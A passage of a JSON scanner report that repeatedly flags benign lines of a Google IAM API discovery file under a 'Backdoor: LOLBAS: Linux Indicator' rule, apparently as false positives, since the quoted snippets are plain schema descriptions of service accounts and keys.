                      "markdown": "` Identity and Access Management (IAM) policy. It is used to\\nspecify access control policies for Cloud Platform resources.\\n\\n\\nA `Policy` consists of a list of `bindings`. A `Binding` binds a list of\\n`members` to a `role`, where the members can be user accounts, Google groups,\\nGoogle domains, and service accounts. A `role` is a named list of permissions\\ndefined by IAM.\\n\\n**Example**\\n\\n    {\\n      \\\"bindings\\\": [\\n        {\\n          \\\"role\\\": \\\"roles\\/owner\\\",\\n          \\\"members\\\": [\\n            \\\"user:mike@example.com\\\",\\n            \\\"group:admins@example.com\\\",\\n            \\\"domain:googl`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 323,
                  "startColumn": 25,
                  "endLine": 323,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    },\n    \"SignJwtResponse\": {\n      \"id\": \"SignJwtResponse\",\n      \"description\": \"The service account sign JWT response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keyId\": {\n",
                    "rendered": {
                      "text": "    },\n    \"SignJwtResponse\": {\n      \"id\": \"SignJwtResponse\",\n      \"description\": \"The service account sign JWT response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keyId\": {\n",
                      "markdown": "`    },\n    \"SignJwtResponse\": {\n      \"id\": \"SignJwtResponse\",\n      \"description\": \"The service account sign JWT response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keyId\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 312,
                  "startColumn": 25,
                  "endLine": 312,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    },\n    \"SignJwtRequest\": {\n      \"id\": \"SignJwtRequest\",\n      \"description\": \"The service account sign JWT request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"payload\": {\n",
                    "rendered": {
                      "text": "    },\n    \"SignJwtRequest\": {\n      \"id\": \"SignJwtRequest\",\n      \"description\": \"The service account sign JWT request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"payload\": {\n",
                      "markdown": "`    },\n    \"SignJwtRequest\": {\n      \"id\": \"SignJwtRequest\",\n      \"description\": \"The service account sign JWT request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"payload\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 296,
                  "startColumn": 25,
                  "endLine": 296,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    },\n    \"SignBlobResponse\": {\n      \"id\": \"SignBlobResponse\",\n      \"description\": \"The service account sign blob response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keyId\": {\n",
                    "rendered": {
                      "text": "    },\n    \"SignBlobResponse\": {\n      \"id\": \"SignBlobResponse\",\n      \"description\": \"The service account sign blob response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keyId\": {\n",
                      "markdown": "`    },\n    \"SignBlobResponse\": {\n      \"id\": \"SignBlobResponse\",\n      \"description\": \"The service account sign blob response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keyId\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 284,
                  "startColumn": 25,
                  "endLine": 284,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    },\n    \"SignBlobRequest\": {\n      \"id\": \"SignBlobRequest\",\n      \"description\": \"The service account sign blob request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"bytesToSign\": {\n",
                    "rendered": {
                      "text": "    },\n    \"SignBlobRequest\": {\n      \"id\": \"SignBlobRequest\",\n      \"description\": \"The service account sign blob request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"bytesToSign\": {\n",
                      "markdown": "`    },\n    \"SignBlobRequest\": {\n      \"id\": \"SignBlobRequest\",\n      \"description\": \"The service account sign blob request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"bytesToSign\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 263,
                  "startColumn": 25,
                  "endLine": 263,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    },\n    \"CreateServiceAccountKeyRequest\": {\n      \"id\": \"CreateServiceAccountKeyRequest\",\n      \"description\": \"The service account key create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"privateKeyType\": {\n",
                    "rendered": {
                      "text": "    },\n    \"CreateServiceAccountKeyRequest\": {\n      \"id\": \"CreateServiceAccountKeyRequest\",\n      \"description\": \"The service account key create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"privateKeyType\": {\n",
                      "markdown": "`    },\n    \"CreateServiceAccountKeyRequest\": {\n      \"id\": \"CreateServiceAccountKeyRequest\",\n      \"description\": \"The service account key create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"privateKeyType\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 222,
                  "startColumn": 50,
                  "endLine": 222,
                  "endColumn": 59,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n        \"privateKeyType\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n        \"privateKeyType\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n        \"privateKeyType\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 604,
                  "endLine": 218,
                  "endColumn": 613,
                  "snippet": {
                    "text": "unts.  Users retain the private key of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for all service accounts are also published at the OAuth2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n        ",
                    "rendered": {
                      "text": "unts.  Users retain the private key of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for all service accounts are also published at the OAuth2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n        ",
                      "markdown": "`unts.  Users retain the private key of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for all service accounts are also published at the OAuth2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n        `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 291,
                  "endLine": 218,
                  "endColumn": 300,
                  "snippet": {
                    "text": "untKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for",
                    "rendered": {
                      "text": "untKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for",
                      "markdown": "`untKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 60,
                  "endLine": 218,
                  "endColumn": 69,
                  "snippet": {
                    "text": "cription\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n          }\n        }\n      }\n    },\n    \"ServiceAccountKey\": {\n      \"id\": \"ServiceAccountKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of these key-pairs,\\nand Goog",
                    "rendered": {
                      "text": "cription\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n          }\n        }\n      }\n    },\n    \"ServiceAccountKey\": {\n      \"id\": \"ServiceAccountKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of these key-pairs,\\nand Goog",
                      "markdown": "`cription\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n          }\n        }\n      }\n    },\n    \"ServiceAccountKey\": {\n      \"id\": \"ServiceAccountKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of these key-pairs,\\nand Goog`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 34,
                  "endLine": 218,
                  "endColumn": 43,
                  "snippet": {
                    "text": "  \"keys\": {\n          \"description\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n          }\n        }\n      }\n    },\n    \"ServiceAccountKey\": {\n      \"id\": \"ServiceAccountKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of ",
                    "rendered": {
                      "text": "  \"keys\": {\n          \"description\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n          }\n        }\n      }\n    },\n    \"ServiceAccountKey\": {\n      \"id\": \"ServiceAccountKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of ",
                      "markdown": "`  \"keys\": {\n          \"description\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n          }\n        }\n      }\n    },\n    \"ServiceAccountKey\": {\n      \"id\": \"ServiceAccountKey\",\n      \"description\": \"Represents a service account key.\\n\\nA service account has two sets of key-pairs: user-managed, and\\nsystem-managed.\\n\\nUser-managed key-pairs can be created and deleted by users.  Users are\\nresponsible for rotating these keys periodically to ensure security of\\ntheir service accounts.  Users retain the private key of `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 49,
                  "endLine": 208,
                  "endColumn": 58,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"keys\": {\n          \"description\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"keys\": {\n          \"description\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"keys\": {\n          \"description\": \"The public keys for the service account.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"ServiceAccountKey\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 25,
                  "endLine": 204,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    },\n    \"ListServiceAccountKeysResponse\": {\n      \"id\": \"ListServiceAccountKeysResponse\",\n      \"description\": \"The service account keys list response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keys\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ListServiceAccountKeysResponse\": {\n      \"id\": \"ListServiceAccountKeysResponse\",\n      \"description\": \"The service account keys list response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keys\": {\n",
                      "markdown": "`    },\n    \"ListServiceAccountKeysResponse\": {\n      \"id\": \"ListServiceAccountKeysResponse\",\n      \"description\": \"The service account keys list response.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"keys\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 231,
                  "endLine": 197,
                  "endColumn": 240,
                  "snippet": {
                    "text": "    },\n    \"Empty\": {\n      \"id\": \"Empty\",\n      \"description\": \"A generic empty message that you can re-use to avoid defining duplicated\\nempty messages in your APIs. A typical example is to use it as the request\\nor the response type of an API method. For instance:\\n\\n    service Foo {\\n      rpc Bar(google.protobuf.Empty) returns (google.protobuf.Empty);\\n    }\\n\\nThe JSON representation for `Empty` is empty JSON object `{}`.\",\n      \"type\": \"object\",\n      \"properties\": {\n      }\n",
                    "rendered": {
                      "text": "    },\n    \"Empty\": {\n      \"id\": \"Empty\",\n      \"description\": \"A generic empty message that you can re-use to avoid defining duplicated\\nempty messages in your APIs. A typical example is to use it as the request\\nor the response type of an API method. For instance:\\n\\n    service Foo {\\n      rpc Bar(google.protobuf.Empty) returns (google.protobuf.Empty);\\n    }\\n\\nThe JSON representation for `Empty` is empty JSON object `{}`.\",\n      \"type\": \"object\",\n      \"properties\": {\n      }\n",
                      "markdown": "`    },\n    \"Empty\": {\n      \"id\": \"Empty\",\n      \"description\": \"A generic empty message that you can re-use to avoid defining duplicated\\nempty messages in your APIs. A typical example is to use it as the request\\nor the response type of an API method. For instance:\\n\\n    service Foo {\\n      rpc Bar(google.protobuf.Empty) returns (google.protobuf.Empty);\\n    }\\n\\nThe JSON representation for `Empty` is empty JSON object `{}`.\",\n      \"type\": \"object\",\n      \"properties\": {\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 79,
                  "endLine": 186,
                  "endColumn": 88,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"accountId\": {\n          \"description\": \"Required. The account id that is used to generate the service account\\nemail address and a stable unique id. It is unique within a project,\\nmust be 1-63 characters long, and match the regular expression\\n`[a-z]([-a-z0-9]*[a-z0-9])` to comply with RFC1035.\",\n          \"type\": \"string\"\n        },\n        \"serviceAccount\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"accountId\": {\n          \"description\": \"Required. The account id that is used to generate the service account\\nemail address and a stable unique id. It is unique within a project,\\nmust be 1-63 characters long, and match the regular expression\\n`[a-z]([-a-z0-9]*[a-z0-9])` to comply with RFC1035.\",\n          \"type\": \"string\"\n        },\n        \"serviceAccount\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"accountId\": {\n          \"description\": \"Required. The account id that is used to generate the service account\\nemail address and a stable unique id. It is unique within a project,\\nmust be 1-63 characters long, and match the regular expression\\n`[a-z]([-a-z0-9]*[a-z0-9])` to comply with RFC1035.\",\n          \"type\": \"string\"\n        },\n        \"serviceAccount\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 25,
                  "endLine": 182,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    },\n    \"CreateServiceAccountRequest\": {\n      \"id\": \"CreateServiceAccountRequest\",\n      \"description\": \"The service account create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"accountId\": {\n",
                    "rendered": {
                      "text": "    },\n    \"CreateServiceAccountRequest\": {\n      \"id\": \"CreateServiceAccountRequest\",\n      \"description\": \"The service account create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"accountId\": {\n",
                      "markdown": "`    },\n    \"CreateServiceAccountRequest\": {\n      \"id\": \"CreateServiceAccountRequest\",\n      \"description\": \"The service account create request.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"accountId\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 175,
                  "startColumn": 67,
                  "endLine": 175,
                  "endColumn": 76,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"oauth2ClientId\": {\n          \"description\": \"@OutputOnly. The OAuth2 client id for the service account.\\nThis is used in conjunction with the OAuth2 clientconfig API to make\\nthree legged OAuth2 (3LO) flows to access the data of Google users.\",\n          \"type\": \"string\"\n        }\n      }\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"oauth2ClientId\": {\n          \"description\": \"@OutputOnly. The OAuth2 client id for the service account.\\nThis is used in conjunction with the OAuth2 clientconfig API to make\\nthree legged OAuth2 (3LO) flows to access the data of Google users.\",\n          \"type\": \"string\"\n        }\n      }\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"oauth2ClientId\": {\n          \"description\": \"@OutputOnly. The OAuth2 client id for the service account.\\nThis is used in conjunction with the OAuth2 clientconfig API to make\\nthree legged OAuth2 (3LO) flows to access the data of Google users.\",\n          \"type\": \"string\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 171,
                  "startColumn": 78,
                  "endLine": 171,
                  "endColumn": 87,
                  "snippet": {
                    "text": "          \"format\": \"byte\"\n        },\n        \"description\": {\n          \"description\": \"Optional. A user-specified opaque description of the service account.\",\n          \"type\": \"string\"\n        },\n        \"oauth2ClientId\": {\n",
                    "rendered": {
                      "text": "          \"format\": \"byte\"\n        },\n        \"description\": {\n          \"description\": \"Optional. A user-specified opaque description of the service account.\",\n          \"type\": \"string\"\n        },\n        \"oauth2ClientId\": {\n",
                      "markdown": "`          \"format\": \"byte\"\n        },\n        \"description\": {\n          \"description\": \"Optional. A user-specified opaque description of the service account.\",\n          \"type\": \"string\"\n        },\n        \"oauth2ClientId\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 71,
                  "endLine": 162,
                  "endColumn": 80,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"displayName\": {\n          \"description\": \"Optional. A user-specified description of the service account.  Must be\\nfewer than 100 UTF-8 bytes.\",\n          \"type\": \"string\"\n        },\n        \"etag\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"displayName\": {\n          \"description\": \"Optional. A user-specified description of the service account.  Must be\\nfewer than 100 UTF-8 bytes.\",\n          \"type\": \"string\"\n        },\n        \"etag\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"displayName\": {\n          \"description\": \"Optional. A user-specified description of the service account.  Must be\\nfewer than 100 UTF-8 bytes.\",\n          \"type\": \"string\"\n        },\n        \"etag\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 158,
                  "startColumn": 62,
                  "endLine": 158,
                  "endColumn": 71,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"email\": {\n          \"description\": \"@OutputOnly The email address of the service account.\",\n          \"type\": \"string\"\n        },\n        \"displayName\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"email\": {\n          \"description\": \"@OutputOnly The email address of the service account.\",\n          \"type\": \"string\"\n        },\n        \"displayName\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"email\": {\n          \"description\": \"@OutputOnly The email address of the service account.\",\n          \"type\": \"string\"\n        },\n        \"displayName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
